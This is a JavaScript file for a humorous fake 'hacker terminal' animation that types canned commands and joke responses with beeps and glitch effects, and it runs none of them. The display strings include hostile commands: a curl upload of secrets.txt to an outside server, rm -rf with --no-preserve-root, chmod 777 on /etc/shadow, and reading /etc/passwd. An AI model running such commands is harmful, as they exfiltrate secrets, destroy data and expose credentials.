/* 
   TERMINAL ELEMENT
*/

const terminalBody = document.getElementById("terminalBody");
const terminalWindow = document.querySelector(".terminal-window");


/* 
   ARRAY OF FAKE HACKER COMMANDS
*/

const commandList = [

    {
        command: "nmap -sV --script=vuln 192.168.1.1",
        response: "22/tcp open ssh | 80/tcp open http | Vulnerabilities detected...",
        progress: true,
        glitch: false
    },

    {
        command: "ssh root@192.168.1.1 -p 22",
        response: "Access granted. Welcome back, ghost operator.",
        progress: false,
        glitch: true
    },

    {
        command: "sudo rm -rf /system32 --no-preserve-root",
        response: "Deleting files... This was probably a bad idea.",
        progress: true,
        glitch: true
    },

    {
        command: "chmod 777 /etc/shadow",
        response: "Security level changed from 'protected' to 'absolutely terrible'.",
        progress: false,
        glitch: true
    },

    {
        command: "wget https://definitely-not-illegal.com/passwords.zip",
        response: "Downloading 4.2GB of extremely suspicious data...",
        progress: true,
        glitch: false
    },

    {
        command: "python3 crack_wifi.py --target TP-Link_2.4GHz",
        response: "Password cracked: chai12345",
        progress: true,
        glitch: true
    },

    {
        command: "cat /etc/passwd | grep root",
        response: "root:x:0:0:root:/root:/bin/bash",
        progress: false,
        glitch: false
    },

    {
        command: "curl -X POST https://shadow-server.io/upload --data @secrets.txt",
        response: "Upload complete. The FBI definitely noticed that.",
        progress: true,
        glitch: true
    },

    {
        command: "git push origin main --force",
        response: "WARNING: You just overwrote everyone's work. Classic.",
        progress: false,
        glitch: true
    },

    {
        command: "npm install",
        response: "Installing 847 packages... 423 vulnerabilities found. Ignoring.",
        progress: true,
        glitch: false
    },

    {
        command: "ping google.com",
        response: "Request timeout. Have you tried turning it off and on again?",
        progress: false,
        glitch: false
    },

    {
        command: "sudo make me a sandwich",
        response: "What? Make it yourself.",
        progress: false,
        glitch: true
    }

];


/* 
   TRACKS WHICH COMMAND IS CURRENTLY RUNNING
*/

let currentCommandIndex = 0;


/* 
   CREATES A SMALL BEEP SOUND
*/

function playBeepSound(frequency, duration) {

    const audioContext = new AudioContext();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();

    oscillator.frequency.value = frequency;
    oscillator.type = "square";

    gainNode.gain.value = 0.03;

    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);

    oscillator.start();

    setTimeout(() => {

        oscillator.stop();
        audioContext.close();

    }, duration);

}


/* 
   SCROLLS TERMINAL TO THE LATEST LINE
*/

function autoScroll() {

    terminalBody.scrollTop = terminalBody.scrollHeight;

}


/* 
   TRIGGERS A QUICK SCREEN GLITCH
*/

function triggerGlitchEffect() {

    terminalWindow.classList.add("glitch-screen");
    playBeepSound(90, 120);

    setTimeout(() => {

        terminalWindow.classList.remove("glitch-screen");

    }, 800);

}


/* 
   TYPES TEXT LETTER BY LETTER USING setInterval
*/

function typewriterEffect(text, element, speed, callback) {

    let characterIndex = 0;

    const typingInterval = setInterval(() => {

        element.innerHTML =
            text.substring(0, characterIndex + 1) +
            '<span class="cursor">|</span>';

        playBeepSound(420, 20);

        characterIndex++;

        autoScroll();

        if (characterIndex === text.length) {

            clearInterval(typingInterval);

            element.innerHTML = text;

            if (callback) {
                callback();
            }

        }

    }, speed);

}


/* 
   SHOWS A FAKE PROGRESS BAR
*/

function showProgressBar(callback) {

    const progressLine = document.createElement("div");

    progressLine.classList.add("progress-line");

    terminalBody.appendChild(progressLine);

    let progressValue = 0;

    const progressInterval = setInterval(() => {

        progressValue += 10;

        const filledBlocks = "█".repeat(progressValue / 10);
        const emptyBlocks = "░".repeat(10 - progressValue / 10);

        progressLine.textContent =
            "Processing [" + filledBlocks + emptyBlocks + "] " + progressValue + "%";

        playBeepSound(260, 25);

        autoScroll();

        if (progressValue >= 100) {

            clearInterval(progressInterval);

            setTimeout(() => {

                if (callback) {
                    callback();
                }

            }, 500);

        }

    }, 120);

}


/* 
   SHOWS THE RESPONSE AFTER A COMMAND FINISHES
*/

function showResponse(currentCommand) {

    const responseLine = document.createElement("div");

    responseLine.classList.add("response-line");

    if (currentCommand.response.includes("WARNING")) {
        responseLine.classList.add("warning-line");
    }

    terminalBody.appendChild(responseLine);

    typewriterEffect(currentCommand.response, responseLine, 18, () => {

        if (currentCommand.glitch) {
            triggerGlitchEffect();
        }

        setTimeout(() => {

            currentCommandIndex++;

            runNextCommand();

        }, 900);

    });

}


/* 
   DECIDES WHETHER TO SHOW A PROGRESS BAR BEFORE RESPONSE
*/

function prepareResponse(currentCommand) {

    if (currentCommand.progress) {

        showProgressBar(() => {

            showResponse(currentCommand);

        });

    } else {

        showResponse(currentCommand);

    }

}


/* 
   RUNS THE NEXT COMMAND IN THE ARRAY
*/

function runNextCommand() {

    if (currentCommandIndex >= commandList.length) {

        const dramaticMessage = document.createElement("div");

        dramaticMessage.classList.add("response-line");
        dramaticMessage.classList.add("warning-line");

        terminalBody.appendChild(dramaticMessage);

        triggerGlitchEffect();

        typewriterEffect(
            "SYSTEM REBOOTING... TRACKS COVERED... RECONNECTING TO SHADOW NETWORK...",
            dramaticMessage,
            25,
            () => {

                setTimeout(() => {

                    currentCommandIndex = 0;

                    terminalBody.innerHTML = "";

                    runNextCommand();

                }, 3000);

            }
        );

        return;

    }

    const currentCommand = commandList[currentCommandIndex];

    const commandLine = document.createElement("div");

    commandLine.classList.add("command-line");

    terminalBody.appendChild(commandLine);

    const commandPrefix =
        '<span class="prefix">[root@shadowbox ~]$ </span>';

    typewriterEffect(
        commandPrefix + currentCommand.command,
        commandLine,
        35,
        () => {

            setTimeout(() => {

                prepareResponse(currentCommand);

            }, 700);

        }
    );

}


/* 
   STARTS THE TERMINAL AUTOMATICALLY WHEN PAGE LOADS
*/

runNextCommand();